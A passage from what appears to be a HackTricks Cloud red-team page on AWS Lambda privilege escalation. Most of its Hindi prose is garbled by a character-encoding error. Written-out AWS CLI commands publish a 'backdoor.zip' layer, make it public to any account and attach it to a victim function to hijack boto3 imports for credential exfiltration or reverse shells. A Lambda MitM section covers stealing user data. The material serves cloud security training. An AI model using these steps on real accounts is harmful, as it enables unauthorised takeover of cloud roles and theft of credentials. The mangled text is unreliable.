8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреБрд╕реНрддрдХрд╛рд▓рдп boto3 рдХреЛ `/var/runtime/boto3` (4рдереА рд╕реНрдерд┐рддрд┐) рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

`lambda:UpdateFunctionConfiguration` рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдирдпрд╛ рд▓реЗрдпрд░** рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рд▓реЗрдпрд░ рдореЗрдВ рдХреБрдЫ **рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд▓реИрдореНрдмреНрдбрд╛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИред** рдпрджрд┐ рдЖрдк рд▓реИрдореНрдмреНрдбрд╛ рдХрд╛ рдХреЛрдб рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд▓реИрдореНрдмреНрдбрд╛ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ** рдФрд░ рдЖрдк **рд▓реЗрдпрд░ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╡рд╣рд╛рдБ рдЕрдкрдирд╛ рдХреЛрдб рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред**

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рд▓реИрдореНрдмреНрдбрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп boto3 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдпрд╣ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрддрд┐рдо рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд╕рд╛рде рдПрдХ рд╕реНрдерд╛рдиреАрдп рд▓реЗрдпрд░ рдмрдирд╛рдПрдЧрд╛:
```bash
pip3 install -t ./lambda_layer boto3
```
рдЖрдк `./lambda_layer/boto3/__init__.py` рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╡реИрд╢реНрд╡рд┐рдХ рдХреЛрдб рдореЗрдВ рдмреИрдХрдбреЛрд░ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)ред

рдлрд┐рд░, рдЙрд╕ `./lambda_layer` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдЬрд╝рд┐рдк рдХрд░реЗрдВ рдФрд░ **рдирдИ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░** рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ (рдпрд╛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЦрд╛рддреЗ рдореЗрдВ, рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ) рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ рдПрдХ рдкрд╛рдпрдерди рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рд╡рд╣рд╛рдВ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд░рдЦрдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ /opt/python/boto3 рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд▓реЗрдпрд░ рдХреЛ **рд▓реИрдореНрдмреНрдбрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдкрд╛рдпрдерди рд╕рдВрд╕реНрдХрд░рдг** рдХреЗ рд╕рд╛рде **рд╕рдВрдЧрдд** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ **рд╕рдорд╛рди рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:** 

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

рдЕрдм, рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░ рдХреЛ **рдХрд┐рд╕реА рднреА рдЦрд╛рддреЗ рджреНрд╡рд╛рд░рд╛ рд╕реБрд▓рдн** рдмрдирд╛рдПрдВ:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
рдФрд░ рдкреАрдбрд╝рд┐рдд рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░ рдХреЛ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВ:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
The next step would be to either **invoke the function** ourselves if we can or to wait until **рдпрд╣ invoke рд╣реЛрддрд╛ рд╣реИ** by normal meansтАУwhich is the safer method.

A **more stealth way to exploit this vulnerability** can be found in:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potential Impact:** Direct privesc to the lambda service role used.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Maybe with those permissions you are able to create a function and execute it calling the URL... but I could find a way to test it, so let me know if you do!

### Lambda MitM

Some lambdas are going to be **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред** If get RCE in one of them, you can exfiltrate the info other users are sending to it, check it in:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## References

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
